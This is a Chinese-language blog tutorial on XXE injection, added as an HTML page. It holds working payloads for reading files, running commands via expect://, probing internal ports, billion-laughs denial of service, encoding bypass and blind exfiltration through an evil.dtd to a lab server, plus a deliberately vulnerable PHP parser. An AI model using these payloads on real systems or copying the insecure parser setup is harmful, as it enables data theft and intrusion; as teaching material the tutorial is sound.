@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>web安全-XXE | Wisejay | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="web安全">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>web安全-XXE</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">web安全-XXE</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2021-05-02T15:59:53.948Z" itemprop="datePublished" class="page-time">
+  2021-05-02
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-XXE"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">web安全-XXE</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2021-05-02 23:59:53" datetime="2021-05-02T15:59:53.948Z"  itemprop="datePublished">2021-05-02</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web安全/">web安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><blockquote>
+<p>Author:<code>wisejay</code></p>
+<p>Email:<code>wisejay@foxmail.com</code></p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XXE漏洞（XML External Entity Injection）即xml外部实体注入漏洞。</p>
+<p>XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<h2 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--第一部分是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码 (utf-8)--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第二部分：文档类型定义 DTD--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--定义此文档是note类型的文档--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[ </span></span><br><span class="line"><span class="meta">&lt;!--外部实体声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY entity-name SYSTEM "URI/URL"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--第三部分：文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="DTD实体"><a href="#DTD实体" class="headerlink" title="DTD实体"></a>DTD实体</h2><p><code>%name（参数实体）是在DTD中被引用的，而&amp;name（一般实体）是在xml文档中被引用的</code></p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体值&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用方式：&amp;实体名称;主要在XML文档中被应用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY name &quot;entityname&quot;&gt;]&gt;</span><br><span class="line">&lt;note&gt;&amp;name;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用方式：&amp;实体名称;主要在XML文档中被应用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE note [  </span><br><span class="line">	&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt; </span><br><span class="line">&lt;note&gt;&amp;name;&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">	&lt;!ENTITY % name SYSTEM &quot;http://xxxx.ceye.io/&quot;&gt;</span><br><span class="line">%name;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;test&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE检测"><a href="#XXE检测" class="headerlink" title="XXE检测"></a>XXE检测</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $result= simplexml_load_string($xmlfile, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>请求头中添加Content-Type：text/xml,或Content-type:application/xml，我们就可以用以下语句进行测试。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">&lt;!ENTITY words "xxe"&gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;words;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329160030099.png" title="image-20210329160030099" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329160030099.png" alt="image-20210329160030099" title class></a>
+                <p>image-20210329160030099</p>
+            </figure>
+
+<h2 id="XXE利用"><a href="#XXE利用" class="headerlink" title="XXE利用"></a>XXE利用</h2><h3 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h3><p>语法引用外部的实体URL支持的协议如下，不同的程序支持的不一样。</p>
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329191301487.png" title="image-20210329191301487" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329191301487.png" alt="image-20210329191301487" title class></a>
+                <p>image-20210329191301487</p>
+            </figure>
+
+<p>php安装扩展后还能支持的一些协议：</p>
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329191324197.png" title="image-20210329191324197" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210329191324197.png" alt="image-20210329191324197" title class></a>
+                <p>image-20210329191324197</p>
+            </figure>
+
+<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="读取任意文件"><a href="#读取任意文件" class="headerlink" title="读取任意文件"></a>读取任意文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210330212609584.png" title="image-20210330212609584" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210330212609584.png" alt="image-20210330212609584" title class></a>
+                <p>image-20210330212609584</p>
+            </figure>
+
+<h4 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h4><p>PHP要开启PECL上的Expect扩展</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="探测内网端口"><a href="#探测内网端口" class="headerlink" title="探测内网端口"></a>探测内网端口</h4><p>根据响应包的信息，若非“connection refused”则表示该端口可能是开放的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:8080/&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h4><p>构造恶意的XML实体文件耗尽可用内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [ </span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">......</span><br><span class="line">&lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure>
+
+<p>XML解析器加载该文档时，它会看到它包含一个根元素“lolz”，该元素包含文本“&lol9;”。</p>
+<p>然而，“&lol9;”是一个已定义的实体，它扩展为包含十个“&lol8;”字符串。</p>
+<p>每个“&lol8;”字符串都是一个已定义的实体，可以扩展到10个“&lol7;”字符串，以此类推。</p>
+<p>在处理完所有的实体扩展之后内存就被大大消耗啦</p>
+<h2 id="XXE进阶"><a href="#XXE进阶" class="headerlink" title="XXE进阶"></a>XXE进阶</h2><h3 id="CDATA使用"><a href="#CDATA使用" class="headerlink" title="CDATA使用"></a>CDATA使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/2.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--2.txt中的内容如下 --&gt;</span><br><span class="line">&amp;test;</span><br></pre></td></tr></table></figure>
+
+<p>我们前面读取到文件中都是不包含<code>&amp;</code>、<code>&lt;</code>等特殊符号，如果存在特殊符号就会因为闭合错误而报错</p>
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210401223312076.png" title="image-20210401223312076" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210401223312076.png" alt="image-20210401223312076" title class></a>
+                <p>image-20210401223312076</p>
+            </figure>
+
+<p>这时候我们就需要用到<code>CDATA</code>:CDATA 是不会被解析器解析的文本。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[ // 开始</span><br><span class="line">内容</span><br><span class="line">]]&gt; // 结束</span><br></pre></td></tr></table></figure>
+
+<p>所以我们把之前的修改成如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/2.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&lt;![CDATA[&amp;xxe;]]&gt;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们构造如下使用是会<strong>报错</strong>的，因为<code>标签必须在同一个实体中闭合</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/2.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY end &quot;]]&gt;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;start;&amp;xxe;&amp;end;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们就要引入参数实体啦</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:///c:/2.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&amp;lt;!ENTITY all &apos;%start;%xxe;%end;&apos;&amp;gt;&quot;&gt;</span><br><span class="line">%all;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还是会报错因为实体内部禁止引用实体，所以需要构造外部实体。</p>
+<p>第一步构建一个外部实体<code>test.dtd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%xxe;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改参数如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;file:///c:/2.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.65.128/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;name&gt;&amp;all;&lt;/name&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210401233408610.png" title="image-20210401233408610" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210401233408610.png" alt="image-20210401233408610" title class></a>
+                <p>image-20210401233408610</p>
+            </figure>
+
+<h3 id="无回显利用"><a href="#无回显利用" class="headerlink" title="无回显利用"></a>无回显利用</h3><p>测验payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://2gdt63.dnslog.cn&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210501235143336.png" title="image-20210501235143336" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210501235143336.png" alt="image-20210501235143336" title class></a>
+                <p>image-20210501235143336</p>
+            </figure>
+
+<p>无回显的情况下，我们就需要考虑如何外带，我们通过外部实体将参数的内容直接放到url中带出。</p>
+<p>首先创建一个接受url请求的文件(自己服务器)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#receive.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'1.txt'</span>,$_GET[<span class="string">'p'</span>].PHP_EOL,FILE_APPEND);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>创建外部实体文件(自己服务器)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#evil.dtd</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;http://192.168.65.128/xxe/receive.php?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///c:/2.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.65.128/xxe/evil.dtd&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210502110410151.png" title="image-20210502110410151" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210502110410151.png" alt="image-20210502110410151" title class></a>
+                <p>image-20210502110410151</p>
+            </figure>
+
+<p>结果会写入到1.txt中</p>
+<figure class="image-box">
+                <a rel=web安全-XXE href="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210502110435522.png" title="image-20210502110435522" data-fancybox="images"><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210502110435522.png" alt="image-20210502110435522" title class></a>
+                <p>image-20210502110435522</p>
+            </figure>
+
+<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p>编码绕过</p>
+<p>linux系统使用iconv命令</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 utf-8.xml &gt; utf-16.xml</span><br><span class="line">iconv -f utf8 -t utf7 utf-8.xml &gt; utf-7.xml</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#utf-8</span><br><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;]&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">  </span><br><span class="line">#utf-7编码绕过，需要设置utf-7头</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-7&quot;?&gt;</span><br><span class="line">+ADwAIQ-DOCTYPE note +AFs</span><br><span class="line">+ADwAIQ-ENTITY xxe SYSTEM +ACI-file:///c:/windows/system.ini+ACIAPgBdAD4</span><br><span class="line">+ADw-name+AD4AJg-xxe+ADsAPA-/name+AD4</span><br><span class="line"></span><br><span class="line">#utf-16这里没有尝试成功</span><br></pre></td></tr></table></figure>
+
